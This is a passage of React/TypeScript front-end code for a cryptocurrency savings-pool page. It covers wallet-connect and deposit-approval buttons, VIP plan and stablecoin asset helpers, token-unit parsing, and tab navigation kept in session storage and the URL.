          onClick={connectAndPrepare}
          className="w-full rounded-md bg-accent px-4 py-3 text-sm font-semibold text-bg hover:bg-accent/90 transition"
        >
          {c.labels.walletNotConnected}
        </button>
      ) : (
        <button
          type="button"
          onClick={approveDeposit}
          className="w-full rounded-md bg-accent px-4 py-3 text-sm font-semibold text-bg hover:bg-accent/90 transition"
        >
          {authorized ? `${c.labels.authorized}${approvedAsset ? ` · ${approvedAsset}` : ""}` : c.labels.deposit}
        </button>
      )}
      <p className="text-xs text-muted" data-testid="deposit-wallet-status">{status}</p>
    </section>
  );
}

function selectedAssetSymbol(label: string): AssetSymbol | null {
  if (label === "tron-usdt") return null;
  if (label === "ethereum-usdt") return "USDT";
  if (label === "ethereum-usdc") return "USDC";
  if (label === "ethereum-pyusd") return "PYUSD";
  return null;
}

function planToVipName(plan: SavingsPoolPlan): VipPlanName | null {
  if (["VIP1","VIP2","VIP3","VIP4","VIP5","VIP6","VIP7"].includes(plan.name)) {
    return plan.name as VipPlanName;
  }
  return null;
}

function parseUnits(value: string, decimals: number): bigint {
  const normalized = value.replace(/,/g, "").trim();
  if (!/^\d+(\.\d+)?$/.test(normalized)) throw new Error("Invalid amount");
  const [whole, fraction = ""] = normalized.split(".");
  return BigInt(whole) * (10n ** BigInt(decimals)) + BigInt((fraction + "0".repeat(decimals)).slice(0, decimals));
}

function formatUnit(value: bigint, decimals: number): string {
  const base = 10n ** BigInt(decimals);
  const whole = value / base;
  const fraction = (value % base).toString().padStart(decimals, "0").replace(/0+$/, "");
  return fraction ? `${whole}.${fraction}` : whole.toString();
}

function EmptyState() {
  const { c } = usePoolCopy();
  return <div className="py-10 text-center text-muted">{c.labels.noRecord}</div>;
}

export default function SavingsPoolPage() {
  const { c } = usePoolCopy();
  const [mainTab, setMainTab] = useState(() => readSavingsPoolTabIndex());
  const changeMainTab = (index: number) => {
    setMainTab(index);
    setSavingsPoolTab(tabKeys[index] || "pool");
  };

  return (
    <>
      <Header />
      <MarketTicker />
      <main className="mx-auto max-w-xl px-4 py-6">
        <Link href="/" className="text-accent text-sm">← Back to Home</Link>
        <div className="mt-4">
          <div className="flex gap-2 mb-6">
            {c.tabs.map((tab, index) => (
              <MainTab
                key={tab}
                label={tab}
                active={mainTab === index}
                onClick={() => changeMainTab(index)}
              />
            ))}
          </div>

          {mainTab === 0 ? <PoolDataPanel /> : null}
          {mainTab === 1 ? <PlanPanel /> : null}
          {mainTab === 2 ? <AccountPanel /> : null}
          {mainTab === 3 ? <DepositPanel /> : null}

          <PageFooter />
        </div>
      </main>
      <MobileBottomNav />
    </>
  );
}

const tabKeys = ["pool", "plan", "account", "deposit"] as const;

function readSavingsPoolTabIndex() {
  if (typeof window === "undefined") return 0;
  const value = new URLSearchParams(window.location.search).get("tab") || window.sessionStorage.getItem("savingsPoolTab");
  const index = tabKeys.indexOf(value as (typeof tabKeys)[number]);
  return index === -1 ? 0 : index;
}

function setSavingsPoolTab(tab: (typeof tabKeys)[number]) {
  if (typeof window === "undefined") return;
  window.sessionStorage.setItem("savingsPoolTab", tab);
  const nextUrl = new URL(window.location.href);
  nextUrl.searchParams.set("tab", tab);
  window.history.replaceState({}, "", nextUrl);
}
